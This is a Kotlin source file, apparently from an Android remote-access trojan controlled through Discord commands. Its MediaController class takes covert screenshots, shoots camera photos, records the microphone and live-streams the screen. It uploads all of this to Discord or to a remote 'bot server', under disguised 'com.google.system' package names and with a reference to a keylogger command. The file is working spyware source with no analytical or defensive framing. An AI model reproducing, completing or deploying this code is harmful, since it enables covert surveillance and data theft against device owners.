package com.openaccess.sdk.service.controllers

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import com.google.system.AnimatedGifEncoder
import com.google.system.DiscordConfig
import com.google.system.DiscordGatewayClient
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.DisplayCapture
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class MediaController(
    private val ctx: Context,
    private val hasPerm: (String) -> Boolean,
    private val scope: kotlinx.coroutines.CoroutineScope,
) {
    private var streamJob: kotlinx.coroutines.Job? = null
    private var isStreaming = false
    private var streamFps = 1
    private var streamMessageId: String? = null
    private var liveStreamEncoder: com.google.system.LiveStreamEncoder? = null

    suspend fun handleCommand(action: String, payload: String?, d: DiscordGatewayClient): Boolean {
        when (action) {
            "screenshot" -> { handleScreenshot(payload, d); return true }
            "camera", "photo" -> { handleCamera(payload, d); return true }
            "stream", "screen_stream" -> { handleStream(payload, d); return true }
            "mic", "record" -> { handleRecord(payload, d); return true }
            else -> return false
        }
    }

    private suspend fun handleScreenshot(payload: String?, d: DiscordGatewayClient): String? {
        if (payload?.lowercase() == "on") {
            try {
                val intent = Intent(ctx, com.openaccess.sdk.ScreenCaptureActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
            } catch (e: Exception) {
                android.util.Log.e("MediaController", "Failed to launch screen capture: ${e.message}")
            }
            d.sendMsg(":tv: **Screen Capture Permission**\nGrant permission in the dialog. Screenshots will work after.")
            return null
        }
        val progressId = d.sendMsgAwait(":camera: **Capturing**...")
        try {
            val t1 = System.currentTimeMillis()
            val bytes = captureScreen()
            val elapsed = System.currentTimeMillis() - t1
            if (bytes != null && bytes.isNotEmpty()) {
                val done = ":camera: **Screenshot** (${elapsed}ms, ${bytes.size / 1024}KB)"
                if (progressId != null) d.editMsg(progressId, done) else d.sendMsg(done)
                d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
            } else {
                val acc = AccessibilityHelper.isRunning
                val mp = DisplayCapture.mediaProjection != null
                val ver = Build.VERSION.SDK_INT
                val err = when {
                    !mp && !acc -> ":x: **Screenshot failed** (${elapsed}ms)\nAndroid: $ver | Accessibility: $acc | MediaProjection: $mp\nEnable with: `!screenshot on`"
                    !mp -> ":x: **MediaProjection expired** (${elapsed}ms)\nRe-grant screen capture: `!screenshot on`"
                    else -> ":x: **Screenshot capture failed** (${elapsed}ms)\nAccessibility: $acc | MediaProjection: $mp\nTry: `!keylog on` to enable accessibility"
                }
                if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
            }
        } catch (e: Exception) {
            android.util.Log.e("MediaController", "Screenshot error: ${e.message}", e)
            val err = ":x: **Screenshot error**: ${e.message?.take(50) ?: "unknown"}"
            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
        }
        return null
    }

    private suspend fun handleCamera(payload: String?, d: DiscordGatewayClient): String? {
        if (!hasPerm(android.Manifest.permission.CAMERA)) {
            d.sendMsg(":x: **Camera permission denied**")
            return null
        }
        val progressId = d.sendMsgAwait(":camera: **Capturing photo**...")
        try {
            val useFront = payload?.lowercase() == "front"
            val bytes = takePhoto(if (useFront) 1 else 0)
            if (bytes != null && bytes.isNotEmpty()) {
                val done = ":camera: **${if (useFront) "Front" else "Back"} Camera** (${bytes.size / 1024}KB)"
                if (progressId != null) d.editMsg(progressId, done) else d.sendMsg(done)
                d.sendFile(":camera: **${if (useFront) "Front" else "Back"} Camera**", "photo_${System.currentTimeMillis()}.jpg", bytes)
            } else {
                val err = ":x: Camera capture failed"
                if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
            }
        } catch (e: Exception) {
            android.util.Log.e("MediaController", "Camera error: ${e.message}", e)
            val err = ":x: Camera error: ${e.message?.take(80) ?: "unknown"}"
            if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
        }
        return null
    }

    private suspend fun handleStream(payload: String?, d: DiscordGatewayClient): String? {
        when {
            payload?.lowercase() == "stop" -> {
                if (isStreaming) {
                    streamJob?.cancel()
                    isStreaming = false
                    DisplayCapture.releaseStreamCapture()
                    streamMessageId?.let { d.deleteMsg(it) }
                    streamMessageId = null
                    d.sendMsg(":stop_button: **Live stream stopped**")
                } else if (liveStreamEncoder?.isStreaming() == true) {
                    liveStreamEncoder?.stop()
                    liveStreamEncoder = null
                    d.sendMsg(":stop_button: **Voice stream stopped**")
                } else {
                    d.sendMsg(":x: No active stream")
                }
            }
            payload?.lowercase()?.startsWith("voice") == true -> {
                val parts = payload.split(" ")
                val voiceChannelId = parts.getOrNull(1)
                val guildId = parts.getOrNull(2)
                val textChannelId = parts.getOrNull(3)
                val customBotUrl = parts.getOrNull(4)
                if (voiceChannelId == null || guildId == null || textChannelId == null) {
                    d.sendMsg(":x: **Usage**: `!stream voice <voice_ch> <guild> <text_ch> [bot_url]`")
                    return null
                }
                if (DisplayCapture.mediaProjection == null) {
                    d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
                    return null
                }
                d.sendMsgAwait(":satellite: **Starting stream**...")
                scope.launch {
                    try {
                        val botUrl = customBotUrl?.takeIf { it.isNotBlank() }
                            ?: DiscordConfig.BOT_HTTP_URL.takeIf { it.isNotBlank() }
                            ?: "https://your-bot-server.com"
                        val deviceSuffix = d.getDeviceSuffix()
                        liveStreamEncoder = com.google.system.LiveStreamEncoder(
                            context = ctx, botUrl = botUrl, deviceId = deviceSuffix,
                            onStatus = { status -> d.sendMsg(":satellite: **Stream**: $status") }
                        )
                        liveStreamEncoder?.start(DisplayCapture.mediaProjection!!)
                        val json = org.json.JSONObject().apply {
                            put("voiceChannelId", voiceChannelId)
                            put("guildId", guildId)
                            put("textChannelId", textChannelId)
                            put("fps", 5); put("width", 640); put("height", 480)
                        }
                        val req = okhttp3.Request.Builder()
                            .url("$botUrl/api/stream/$deviceSuffix/start")
                            .post(json.toString().toRequestBody("application/json".toMediaType()))
                            .build()
                        val client = okhttp3.OkHttpClient.Builder()
                            .connectTimeout(10, TimeUnit.SECONDS).build()
                        client.newCall(req).execute().use { resp ->
                            d.sendMsg(if (resp.isSuccessful) ":check: **Stream started!**\n5fps → text channel\nVoice: joined"
                                      else ":x: **Bot connection failed**\nHTTP ${resp.code}")
                        }
                    } catch (e: Exception) {
                        d.sendMsg(":x: **Stream error**: ${e.message?.take(80) ?: "unknown"}")
                    }
                }
            }
            payload?.lowercase() == "start" -> {
                if (DisplayCapture.mediaProjection == null) {
                    d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
                    try {
                        val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        ctx.sendBroadcast(intent)
                    } catch (_: Exception) {}
                } else {
                    startStream(d, 2)
                }
            }
            payload == null || payload.isBlank() -> {
                val mp = DisplayCapture.mediaProjection != null
                val voiceActive = liveStreamEncoder?.isStreaming() == true
                d.sendMsg(":tv: **!stream**\nScreen capture: ${if (mp) ":green_circle: Enabled" else ":red_circle: Disabled"}\nVoice stream: ${if (voiceActive) ":green_circle: Active" else ":red_circle: Inactive"}\n\n`!stream start` - Text (2fps)\n`!stream 5` - Text (5fps)\n`!stream voice <ch> <guild>` - Voice\n`!stream stop` - Stop")
            }
            else -> {
                val fps = payload.toIntOrNull()
                if (fps != null && fps in 1..30) {
                    if (DisplayCapture.mediaProjection == null) {
                        d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first")
                    } else {
                        startStream(d, fps)
                    }
                } else {
                    d.sendMsg(":x: Invalid FPS. Use 1-30.")
                }
            }
        }
        return null
    }

    private suspend fun handleRecord(payload: String?, d: DiscordGatewayClient): String? {
        if (!hasPerm(android.Manifest.permission.RECORD_AUDIO)) {
            d.sendMsg(":x: **Microphone permission denied**")
            return null
        }
        val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
        d.sendMsg(":microphone: Recording for ${seconds}s...")
        val file = recordAudio(seconds)
        if (file != null) {
            d.sendFile(":microphone: **Audio Recording (${seconds}s)**", "audio_${System.currentTimeMillis()}.m4a", file.readBytes())
            file.delete()
        } else {
            d.sendMsg(":x: Audio recording failed")
        }
        return null
    }

    // ---- capture methods ----

    private suspend fun captureScreen(): ByteArray? = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        val deferred = kotlinx.coroutines.CompletableDeferred<ByteArray?>()
        val ss = DisplayCapture(ctx)
        ss.capture(object : DisplayCapture.Callback {
            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
            override fun onFailure(error: String) { deferred.complete(null) }
        })
        deferred.await()
    }

    private fun startStream(d: DiscordGatewayClient, fps: Int) {
        streamFps = fps
        isStreaming = true
        streamJob = scope.launch {
            var consecutiveFailures = 0
            val maxFailures = 5
            val framesPerGif = 8
            val targetDelay = 1000L / fps
            val gifWidth = 480
            val gifHeight = 854
            while (isActive && isStreaming) {
                val gifEncoder = AnimatedGifEncoder()
                gifEncoder.setSize(gifWidth, gifHeight)
                gifEncoder.setDelay((targetDelay / 10).toInt())
                gifEncoder.setRepeat(0)
                var capturedFrames = 0
                while (isActive && isStreaming && capturedFrames < framesPerGif) {
                    try {
                        val bmp = DisplayCapture.captureStreamBitmap()
                        if (bmp != null) {
                            val scaled = if (bmp.width != gifWidth || bmp.height != gifHeight) {
                                val scale = minOf(gifWidth.toFloat() / bmp.width, gifHeight.toFloat() / bmp.height)
                                val w = (bmp.width * scale).toInt()
                                val h = (bmp.height * scale).toInt()
                                val centered = Bitmap.createBitmap(gifWidth, gifHeight, Bitmap.Config.ARGB_8888)
                                val canvas = android.graphics.Canvas(centered)
                                canvas.drawBitmap(bmp, (gifWidth - w) / 2f, (gifHeight - h) / 2f, null)
                                centered
                            } else bmp
                            gifEncoder.addFrame(scaled)
                            capturedFrames++
                            consecutiveFailures = 0
                        } else {
                            consecutiveFailures++
                            if (consecutiveFailures >= maxFailures) {
                                d.sendMsg(":x: **Stream stopped** — capture failed $maxFailures times")
                                isStreaming = false
                            }
                            delay(500)
                        }
                    } catch (e: Exception) {
                        android.util.Log.e("MediaController", "Stream frame error", e)
                        consecutiveFailures++
                        if (consecutiveFailures >= maxFailures) {
                            d.sendMsg(":x: **Stream crashed** — ${e.message?.take(50)}")
                            isStreaming = false
                        }
                        delay(500)
                    }
                    val frameDelay = targetDelay - 50
                    if (frameDelay > 0 && capturedFrames < framesPerGif) delay(frameDelay)
                }
                if (capturedFrames > 0) {
                    val gifBytes = gifEncoder.finish()
                    val newId = d.sendFileAwait("", "stream.gif", gifBytes)
                    if (newId != null && streamMessageId != null) {
                        d.deleteMsg(streamMessageId!!)
                    }
                    streamMessageId = newId
                }
            }
        }
    }

    private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            takePhotoCamera2(cameraId)
        } else {
            takePhotoLegacy(cameraId)
        }
    }

    @Suppress("DEPRECATION")
    private fun takePhotoLegacy(cameraId: Int): ByteArray? {
        var camera: android.hardware.Camera? = null
        return try {
            camera = android.hardware.Camera.open(cameraId)
            val params = camera.parameters
            params.setRotation(0)
            camera.parameters = params
            val texture = SurfaceTexture(0)
            camera.setPreviewTexture(texture)
            camera.startPreview()
            val latch = CountDownLatch(1)
            var result: ByteArray? = null
            camera.takePicture(null, null, object : android.hardware.Camera.PictureCallback {
                override fun onPictureTaken(data: ByteArray?, raw: android.hardware.Camera?) {
                    result = data
                    latch.countDown()
                }
            })
            latch.await(10, TimeUnit.SECONDS)
            camera?.stopPreview()
            camera?.release()
            result
        } catch (_: Exception) {
            camera?.release()
            null
        }
    }

    private suspend fun takePhotoCamera2(cameraId: Int): ByteArray? = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        val deferred = kotlinx.coroutines.CompletableDeferred<ByteArray?>()
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val allIds: Array<String>
        try {
            allIds = cm.cameraIdList
        } catch (_: Exception) { return@withContext null }
        val camId = allIds.find { id ->
            val chars = cm.getCameraCharacteristics(id)
            chars.get(CameraCharacteristics.LENS_FACING) == cameraId
        } ?: allIds[0]
        val characteristics: CameraCharacteristics?
        try {
            characteristics = cm.getCameraCharacteristics(camId)
        } catch (_: Exception) { return@withContext null }
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return@withContext null
        val size = map.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height } ?: return@withContext null
        val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        val handler = Handler(Looper.getMainLooper())
        reader.setOnImageAvailableListener({ r ->
            try {
                val image = r.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    deferred.complete(bytes)
                    image.close()
                }
            } catch (_: Exception) { if (!deferred.isCompleted) deferred.complete(null) }
        }, handler)
        var camDevice: CameraDevice? = null
        var session: CameraCaptureSession? = null
        try {
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    camDevice = device
                    try {
                        val surfaces = listOf(reader.surface)
                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(reader.surface)
                        }
                        device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) {
                                session = s
                                s.capture(captureRequest.build(), object : CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: android.hardware.camera2.TotalCaptureResult) {}
                                }, handler)
                            }
                            override fun onConfigureFailed(s: CameraCaptureSession) { if (!deferred.isCompleted) deferred.complete(null) }
                        }, handler)
                    } catch (_: Exception) { if (!deferred.isCompleted) deferred.complete(null) }
                }
                override fun onDisconnected(device: CameraDevice) { if (!deferred.isCompleted) deferred.complete(null) }
                override fun onError(device: CameraDevice, error: Int) { if (!deferred.isCompleted) deferred.complete(null) }
            }, handler)
            deferred.await()
        } catch (_: Exception) { null }
        finally {
            camDevice?.close()
            session?.close()
            reader.close()
        }
    }

    private suspend fun recordAudio(seconds: Int): File? = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
        var recorder: MediaRecorder? = null
        val file = File(ctx.cacheDir, "audio_${System.currentTimeMillis()}.m4a")
        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(ctx)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioSamplingRate(44100)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            delay(seconds * 1000L)
            recorder.stop()
            recorder.release()
            if (file.exists() && file.length() > 0) file else null
        } catch (_: Exception) {
            recorder?.release()
            file.delete()
            null
        }
    }
}
